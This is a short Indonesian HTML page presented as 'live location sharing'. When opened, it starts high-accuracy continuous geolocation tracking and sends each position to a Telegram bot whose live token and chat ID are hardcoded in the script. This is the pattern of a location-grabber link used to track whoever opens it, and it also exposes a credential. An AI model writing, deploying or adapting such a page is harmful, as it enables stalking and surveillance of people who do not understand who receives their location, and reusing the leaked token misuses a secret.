<!DOCTYPE html>
<html>
<head>
  <title>Live Share Lokasi</title>
</head>
<body>
  <h2>Berbagi Lokasi Langsung</h2>
  <p id="status">Mengaktifkan pelacakan lokasi...</p>

  <script>
    const token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
    const chatId = "5677912817";

    function sendLocation(lat, lon) {
      const url = `https://api.telegram.org/bot${token}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;

      fetch(url)
        .then(response => {
          if (response.ok) {
            document.getElementById("status").innerText = `Lokasi terkirim: ${lat}, ${lon}`;
          } else {
            document.getElementById("status").innerText = "Gagal mengirim lokasi.";
          }
        })
        .catch(err => {
          document.getElementById("status").innerText = "Error: " + err;
        });
    }

    function startTracking() {
      if (!navigator.geolocation) {
        document.getElementById("status").innerText = "Geolocation tidak didukung browser.";
        return;
      }

      navigator.geolocation.watchPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          sendLocation(lat, lon);
        },
        (error) => {
          document.getElementById("status").innerText = "Gagal akses lokasi: " + error.message;
        },
        {
          enableHighAccuracy: true,
          maximumAge: 5000,
          timeout: 10000
        }
      );
    }

    startTracking();
  </script>
</body>
</html>
